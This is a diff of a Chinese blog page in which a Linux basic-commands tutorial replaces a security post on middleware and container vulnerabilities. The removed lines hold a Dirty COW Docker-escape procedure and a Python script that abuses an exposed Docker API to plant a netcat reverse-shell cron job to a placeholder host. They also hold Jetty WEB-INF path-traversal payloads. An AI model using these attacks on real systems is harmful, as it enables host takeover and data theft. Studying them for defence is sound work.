+<td><code>-l </code>列表方式显示文件详细信息</td>
+</tr>
+<tr>
+<td><code>ls -lh</code></td>
+<td><code>-h</code>配合<code>-l</code>人性化显示文件大小</td>
+</tr>
+<tr>
+<td><code>ls -a</code></td>
+<td><code>ls -a</code> 显示隐藏文件</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>通配符</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>*</code></td>
+<td>代表任意个数字符。例：<code>ls 1*</code>：列出<code>1</code>开头所有文件</td>
+</tr>
+<tr>
+<td><code>？</code></td>
+<td>用法参考<code>*</code>，但只能代表一个字符</td>
+</tr>
+<tr>
+<td><code>[]</code></td>
+<td>可匹配字符组中任意<strong>一个</strong></td>
+</tr>
+<tr>
+<td><code>[abc]</code></td>
+<td>匹配<code>a、b、c</code>任意一个</td>
+</tr>
+<tr>
+<td><code>[a-f]</code></td>
+<td>匹配<code>a到f</code>任意一个字符</td>
+</tr>
+</tbody></table>
+<p><strong><code>ls -l </code>详细信息</strong> </p>
 <ul>
-<li>由内核漏洞引起 ——Dirty COW(CVE-2016-5195)</li>
-<li>由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271，CVE-2020-15257</li>
-<li>由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式</li>
-<li>CVE-2016-5195</li>
+<li>权限：第一个字符若为<code>d</code>，表示目录。</li>
+<li>硬链接数：通俗讲，有多少方式可访问到当前目录。</li>
+<li>拥有者：家目录下文件/目录拥有者通常是当前用户。</li>
+<li>组</li>
+<li>大小</li>
+<li>时间</li>
+<li>名称</li>
 </ul>
-<h3 id="9-1、利用Dirty-Cow实现Docker逃逸"><a href="#9-1、利用Dirty-Cow实现Docker逃逸" class="headerlink" title="9.1、利用Dirty Cow实现Docker逃逸"></a>9.1、利用Dirty Cow实现Docker逃逸</h3><p> 在 Linux 中，有一个功能：<strong>VDSO(virtual dvnamic shared object)</strong>, 这是一个小型共享库，能将内核自动映射到所有用户程序的地址空间。</p>
-<p>​        Docker 逃逸利用 Dirty Cow 漏洞，将 Payload 写到 VDSO 中的一些闲置内存中，并改变函数的执行顺序，使得在执行正常函数之前调用这个 Shellcode。Shellcode 初始化时会检测是否被 root 所调用，如果调用，则继续执行，如果没有调用则返回，并执行 <code>clock_gettime</code> 函数，接下来它会检测 /tmp/.X 文件的存在，如果存在，则这时已经是 root 权限了，然后它会打开一个反向的 TCP 链接，为 Shellcode 中填写的 ip 返回一个 Shell。</p>
-<p><strong>获得权限后实现逃逸：</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># exp：https://github.com/gebl/dirtycow-docker-vdso</span>
-<span class="token comment"># 使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test</span>
-<span class="token comment"># 其中 test：为临时名称，可以自定义填写。 -p： 第一个端口为本机的端口，第二个端口为Docker的端口。 -itd：意思是在后台运行，交互式运行，并且输出当前的信息 /bin/bash：调用Shell</span>
+<h3 id="Part-7-（用户-组）"><a href="#Part-7-（用户-组）" class="headerlink" title="Part 7:（用户/组）"></a><strong>Part 7:（用户/组）</strong></h3><p><strong>1、chmod</strong></p>
+<ul>
+<li><p><code>chmod</code> 可修改<strong>用户/组</strong>对<strong>文件/目录</strong>的权限</p>
+</li>
+<li><p><code>chmod +/- rwx 文件名｜目录名</code></p>
+<p>例：<code>chmod +r 1.py </code>给文件<code>1.py</code>增加可读权限</p>
+<!--此方式会一次性修改·拥有者/组和其他用户·的权限--></li>
+<li><p><code>chmod -R 777 文件名｜目录名</code> 递归修改文件权限；<code>777</code>-&gt;（用户、组、其他用户 均为<code>rwx</code>）</p>
+</li>
+</ul>
+<p><strong>2、组</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>groupadd</code></td>
+<td>添加组</td>
+</tr>
+<tr>
+<td><code>groupdel</code></td>
+<td>删除组</td>
+</tr>
+<tr>
+<td><code>cat/etc/group</code></td>
+<td>确认组信息（组信息保存在<code>/etc/group</code>）</td>
+</tr>
+<tr>
+<td><code>chgrp -R 目标组名 文件名/目录名</code></td>
+<td>递归修改文件/目录所属组</td>
+</tr>
+</tbody></table>
+<p>​    <strong>2.1、usermod</strong></p>
+<ul>
+<li><p>​    <code>usermod </code>可设置用户的<strong>主组/附加组</strong>和<strong>登录<code>shell</code></strong></p>
+</li>
+<li><p>​    <strong>主组：</strong>通常在新建用户时指定，在etc/passwd的第4列GID对应的组</p>
+</li>
+<li><p>​    <strong>附加组：</strong>在<code>etc/group</code>中最后一列表示该组的<strong>用户列表</strong>，用于指定<strong>用户的附加权限</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>usermod -g 组 用户名</code></td>
+<td>修改用户的主组</td>
+</tr>
+<tr>
+<td><code>usermod -G 组 用户名</code></td>
+<td>修改用户的附加组（重新登录生效）</td>
+</tr>
+<tr>
+<td><code>usermod -s /bin/bash</code></td>
+<td>修改用户的登录<code>shell</code></td>
+</tr>
+</tbody></table>
+<!--useradd添加用户无sudo权限，可将其添加附加组到sudo--></li>
+</ul>
+<p><strong>3、用户</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>useradd -m -g 组 新建用户名</code></td>
+<td><code>-m</code>：自动建立用户家目录<br /><code>-g</code>：指定用户所在组，否则会建立一个同名组</td>
+</tr>
+<tr>
+<td><code>passwd 用户名</code></td>
+<td>设置用户密码、普通用户直接<code>passwd</code>修改自己的账户密码</td>
+</tr>
+<tr>
+<td><code>userdel -r 用户名</code></td>
+<td><code>-r</code>： 自动删除用户家目录</td>
+</tr>
+<tr>
+<td>`cat /etc/passwd</td>
+<td>grep 用户名`</td>
+</tr>
+</tbody></table>
+<p>​    <strong>3.1、查看用户信息</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>id</code></td>
+<td>查看用户<code>UID</code>和<code>GID</code>信息</td>
+</tr>
+<tr>
+<td><code>who</code></td>
+<td>查看当前所有登录的用户列表，以及用户的来源</td>
+</tr>
+<tr>
+<td><code>whoami</code></td>
+<td>查看当前登录用户的账户名</td>
+</tr>
+<tr>
+<td><code>su - 用户名</code></td>
+<td>切换用户；使用<code>-</code>切换到用户家目录否则路径不变；`exit退出到上级用户</td>
+</tr>
+</tbody></table>
+<p>​    <strong>3.2、passwd文件</strong></p>
+<ul>
+<li>用户名</li>
+<li>密码（<code>x</code>，表示加密的密码）</li>
+<li>UID（用户标识）</li>
+<li>GID（组标识）</li>
+<li>用户全名或本地账号</li>
+<li>家目录</li>
+<li>登录使用的shell （<code>ubuntu</code>默认使用<code>dash</code>）</li>
+</ul>
+<!--*********************************-->
 
-<span class="token function">docker</span> run --name<span class="token operator">=</span>test -p <span class="token number">1234</span>:1234 -itd dirtycow /bin/bash 
+<p><strong>4、which</strong></p>
+<ul>
+<li> <code>/etc/passwd</code>：保存用户信息的文件</li>
+<li><code>/usr/bin/passwd</code>：用于修改用户密码的程序</li>
+<li><strong><code>witch</code><strong>命令可以查看</strong>执行命令</strong>的<strong>所在位置</strong></li>
+</ul>
+<!--cd-->
 
-<span class="token comment"># 进入镜像内部</span>
-<span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it <span class="token builtin class-name">test</span> /bin/bash
+<p><strong><code>bin</code> 和<code>sbin</code></strong></p>
+<p>在<code>linux</code>中，绝大多数可执行文件保存在<code>/bin</code>、 <code>/sbin</code>、<code>/usr/bin</code>、<code>/user/sbin</code></p>
+<ul>
+<li>**<code>/bin</code>**（<code>binary</code>）二进制执行文件目录，主要用于具体应用</li>
+<li>**<code>/sbin</code>**（<code>system binary</code>）系统管理员专用二进制代码存放目录，主要用于系统管理</li>
+<li>**<code>/usr/bin</code>**（<code>user commands for applications</code>）后期安装的一些软件</li>
+<li>**<code>/usr/sbin</code>**（<code>super user commands for applications</code>）超级用户的一些管理程序</li>
+</ul>
+<p><strong>5、chown</strong></p>
+<p><strong>修改拥有者</strong></p>
+<p><code>chown 用户名 文件名｜目录名</code></p>
+<h3 id="Part-8-（系统信息）"><a href="#Part-8-（系统信息）" class="headerlink" title="**Part 8:**（系统信息）"></a>**Part 8:**（系统信息）</h3><table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>date</code></td>
+<td>当前系统时间</td>
+</tr>
+<tr>
+<td><code>cal</code></td>
+<td>查看日历<code>-y</code>查看一年日历</td>
+</tr>
+<tr>
+<td><code>df -h</code></td>
+<td><code>disk free</code> 显示磁盘剩余空间</td>
+</tr>
+<tr>
+<td><code>du -h[目录名]</code></td>
+<td><code>disk usage</code>显示目录下文件大小<!---h 人性化显示大小--></td>
+</tr>
+</tbody></table>
+<p><strong>8.1、进程信息</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ps aux</code></td>
+<td><code>process status </code>查看进程详细情况</td>
+</tr>
+<tr>
+<td><!--ps 下的 a、u、x--></td>
+<td><code>a</code>显示所有包括其他用户的进程；<code>u</code>显示进程详细状态；<code>x</code>显示没有控制终端的进程</td>
+</tr>
+<tr>
+<td><code>top</code></td>
+<td>动态显示运行中进程且排序；<code>q</code>退出</td>
+</tr>
+<tr>
+<td><code>kill[-9]进程代号</code></td>
+<td>终止进程代号的进程，<code>-9</code>表示强行终止</td>
+</tr>
+</tbody></table>
+<!--使用`kill`，终止`root`身份开启的进程可能导致系统崩溃-->
 
-<span class="token comment"># 将poc的ip改为容器的ip，make编译poc并运行 poc</span>
-<span class="token builtin class-name">cd</span> /dirtycow-vdso/  
-<span class="token function">make</span>   
-./0xdeadbeef       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="9-2、docker未授权访问漏洞"><a href="#9-2、docker未授权访问漏洞" class="headerlink" title="9.2、docker未授权访问漏洞"></a>9.2、docker未授权访问漏洞</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> docker
-
-client <span class="token operator">=</span> docker<span class="token punctuation">.</span>DockerClient<span class="token punctuation">(</span>base_url<span class="token operator">=</span><span class="token string">'http://目标IP:2375/'</span><span class="token punctuation">)</span>
-
-data <span class="token operator">=</span> client<span class="token punctuation">.</span>containers<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'alpine:latest'</span><span class="token punctuation">,</span> <span class="token triple-quoted-string string">r'''sh -c "echo '* * * * * /usr/bin/nc 反弹IP 端口 -e /bin/sh' >> /tmp/etc/crontabs/root" '''</span><span class="token punctuation">,</span> remove<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> volumes<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'/etc'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">'bind'</span><span class="token punctuation">:</span> <span class="token string">'/tmp/etc'</span><span class="token punctuation">,</span> <span class="token string">'mode'</span><span class="token punctuation">:</span> <span class="token string">'rw'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-
-<span class="token comment"># 监听：反弹端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>参考：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/docker/unauthorized-rce/">https://vulhub.org/#/environments/docker/unauthorized-rce/</a></p>
-<h2 id="10、Jetty"><a href="#10、Jetty" class="headerlink" title="10、Jetty"></a>10、Jetty</h2><p> Jetty 是一个<strong>开源的servlet容器</strong>，它为<strong>基于Java的web容器</strong>，例如JSP和servlet提供运行环境</p>
-<h3 id="10-1、Jetty-WEB-INF敏感信息泄露漏洞分析"><a href="#10-1、Jetty-WEB-INF敏感信息泄露漏洞分析" class="headerlink" title="10.1、Jetty WEB-INF敏感信息泄露漏洞分析"></a>10.1、Jetty WEB-INF敏感信息泄露漏洞分析</h3><p><strong>CVE-2021-28164</strong></p>
-<p>影响版本：9.4.37 </p>
-<p>已在版本 9.4.39 中修复</p>
-<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;%2e&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>CVE-2021-28169</strong></p>
-<p>在版本 9.4.40、10.0.2、11.0.2 之前， <code>ConcatServlet</code>和 <code>WelcomeFilter</code> <strong>Jetty Servlet</strong> 中的类受双重解码错误的影响。  如果开发者手动使用这两个类，攻击者可以利用它们下载<strong>WEB-INF</strong>目录下的任意敏感文件</p>
-<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;static?&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><strong>CVE-2021-34429</strong></p>
-<p><strong>Jetty 9.4.40</strong> 修复了一个模糊路径信息泄露漏洞 <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164">CVE-2021-28164 </a>，CVE-2021-34429 是它的变种和绕过</p>
-<pre class="line-numbers language-none"><code class="language-none">payload：&#x2F;%u002e&#x2F;WEB-INF&#x2F;web.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
+<p><strong>8.2、find</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find[路径] -name &quot;文件&quot;</code></td>
+<td>查找指定路径下的文件；可搭配通配符使用；省略路径表示当前路径查找</td>
+</tr>
+</tbody></table>
+<p><strong>8.3、软链接&amp;硬链接</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ln -s 被链接的源文件 链接文件</code></td>
+<td>建立文件软链接，类似<code>windows</code>快捷方式</td>
+</tr>
+</tbody></table>
+<ul>
+<li>没有<code>-s</code>选项建立的是一个硬链接文件</li>
+<li>源文件要使用<strong>绝对路径</strong>，移动链接文件后仍正正常使用</li>
+<li><code>linux</code>中，<strong>文件名</strong>和<strong>文件数据</strong>分开存储。</li>
+<li><code>ls -l</code>可查看硬链接数。</li>
+</ul>
+<p><img src="http://blog.twowords.top/%E9%93%BE%E6%8E%A5.png" alt="链接"></p>
+<p><strong>8.4、打包压缩</strong></p>
+<ul>
+<li>Windows 常用<code> rar</code></li>
+<li>Mac 常用<code> zip</code></li>
+<li>Linux 常用<code>tar.gz</code></li>
+</ul>
+<p><strong>打包：（tar）</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tar -cvf 打包文件.tar 被打包的文件/路径</code></td>
+<td>打包文件</td>
+</tr>
+<tr>
+<td><code>tar -xvf 打包文件.tar</code></td>
+<td>解包文件</td>
+</tr>
+<tr>
+<td><!--tar选项：c、x、v、f--></td>
+<td><code>c</code>生成档案文件，创建打包文件；<code>x</code>解开档案文件；<code>v</code>列出归档解档详细过程，显示进度；<code>f</code>指定文件名称，<strong>须放最后</strong>，跟.tar文件。</td>
+</tr>
+</tbody></table>
+<p><strong>压缩：（gzip）</strong></p>
+<ul>
+<li><code>gzip</code>压缩<code>tar</code>打包后的文件，扩展名一般用<code>xxx.tar.gz</code></li>
+<li><code>tar</code>命令参数<code>-z</code>可调用<code>gzip</code>，实现压缩解压缩</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tar -zcvf 打包文件.tar.gz 被压缩的文件/路径</code></td>
+<td>压缩文件</td>
+</tr>
+<tr>
+<td><code>tar -zxvf 打包文件.tar.gz</code></td>
+<td>解压缩文件</td>
+</tr>
+<tr>
+<td><code>tar -zxvf 打包文件.tar.gz -C 目标路径</code></td>
+<td>解压缩到指定路径<!--路径必须存在--></td>
+</tr>
+<tr>
+<td><code>-C</code></td>
+<td>解压到指定目录，且目录必须存在。</td>
+</tr>
+</tbody></table>
+<p><strong>压缩：（bzip2）</strong></p>
+<ul>
+<li><code>bzip2</code>压缩<code>tar</code>打包后的文件，扩展名一般用<code>xxx.tar.bz</code></li>
+<li><code>tar</code>命令参数<code>-j</code>可调用<code>bzip2</code>，实现压缩解压缩</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>tar -jcvf 打包文件.tar.bz2 被压缩的文件/路径</code></td>
+<td>压缩文件</td>
+</tr>
+<tr>
+<td><code>tar -jxvf 打包文件.tar.bz2</code></td>
+<td>解压缩文件</td>
+</tr>
+<tr>
+<td><code>-C</code></td>
+<td>解压到指定目录，目录必须存在。</td>
+</tr>
+</tbody></table>
 
                 
             </div>
@@ -756,7 +1051,7 @@ data <span class="token operator">=</span> client<span class="token punctuation"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">白芨</a>
+                    <a href="/about" rel="external nofollow noreferrer">BaiJi</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -766,7 +1061,7 @@ data <span class="token operator">=</span> client<span class="token punctuation"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://jaasenyi.github.io/2022/05/20/ser-zhong-jian-jian-an-quan/">http://jaasenyi.github.io/2022/05/20/ser-zhong-jian-jian-an-quan/</a>
+                    <a href="http://jaasenyi.github.io/2021/12/15/basic-linux-ji-chu-ming-ling/">http://jaasenyi.github.io/2021/12/15/basic-linux-ji-chu-ming-ling/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -779,7 +1074,7 @@ data <span class="token operator">=</span> client<span class="token punctuation"
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">白芨</a>
+                    <a href="/about" target="_blank">BaiJi</a>
                     !
                 </span>
             </div>
@@ -803,15 +1098,7 @@ data <span class="token operator">=</span> client<span class="token punctuation"
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
-                                    <span class="chip bg-color">中间件</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%AE%B9%E5%99%A8/">
-                                    <span class="chip bg-color">容器</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1249,51 +1536,54 @@ data <span class="token operator">=</span> client<span class="token punctuation"
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/05/20/ser-zhong-jian-jian-an-quan/">
+                <a href="/2022/01/15/php-fan-xu-lie-hua/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/ser/server.jpeg" class="responsive-img" alt="服务安全-中间件&amp;容器">
                         
-                        <span class="card-title">服务安全-中间件&amp;容器</span>
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="php反序列化">
+                        
+                        <span class="card-title">php反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Nginx，Apache，Tomcat，Weblogic，JBoos，Jenkin，GlassFish，Webshere，Docker，Jetty
+                            
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-15
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/" class="post-category">
-                                    服务安全
+                            <a href="/categories/web%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    web漏洞
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">
-                        <span class="chip bg-color">中间件</span>
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
                     </a>
                     
-                    <a href="/tags/%E5%AE%B9%E5%99%A8/">
-                        <span class="chip bg-color">容器</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
@@ -1304,15 +1594,16 @@ data <span class="token operator">=</span> client<span class="token punctuation"
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/09/java-anoandrel/">
+                <a href="/2021/12/15/basic-linux-ji-chu-ming-ling/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/AnoandRel.jpeg" class="responsive-img" alt="Java-注解与反射">
                         
-                        <span class="card-title">Java-注解与反射</span>
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1323,28 +1614,17 @@ data <span class="token operator">=</span> client<span class="token punctuation"
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-15
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Java%E7%AF%87/" class="post-category">
-                                    Java篇
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            BaiJi
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Java/">
-                        <span class="chip bg-color">Java</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
